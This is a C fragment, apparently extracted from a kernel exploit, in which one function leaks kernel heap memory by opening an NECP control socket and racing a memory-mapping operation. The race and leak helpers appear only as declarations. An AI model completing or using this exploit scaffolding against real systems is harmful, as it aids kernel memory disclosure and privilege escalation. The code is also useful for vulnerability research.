
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct map_address_racer_context {int dummy; } ;
typedef int kernel_leak_callback_block ;


 int ERROR (char*,size_t const) ;
 int close (int) ;
 int open_necp_control_socket (int*) ;
 int start_map_address_racer (struct map_address_racer_context*,size_t) ;
 int stop_map_address_racer (struct map_address_racer_context*) ;
 int try_necp_leak_repeat (int,int ,struct map_address_racer_context*) ;

__attribute__((used)) static bool leak_kernel_heap(size_t leak_size, kernel_leak_callback_block kernel_leak_callback) {
 const size_t MIN_LEAK_SIZE = 16;
 bool success = 0;
 if (leak_size < MIN_LEAK_SIZE) {
  ERROR("Target leak size too small; must be at least %zu bytes", MIN_LEAK_SIZE);
  goto fail_0;
 }
 int ctlfd;
 if (!open_necp_control_socket(&ctlfd)) {
  goto fail_0;
 }
 struct map_address_racer_context context;
 if (!start_map_address_racer(&context, leak_size)) {
  goto fail_1;
 }
 if (!try_necp_leak_repeat(ctlfd, kernel_leak_callback, &context)) {
  goto fail_2;
 }
 success = 1;
fail_2:
 stop_map_address_racer(&context);
fail_1:
 close(ctlfd);
fail_0:
 return success;
}
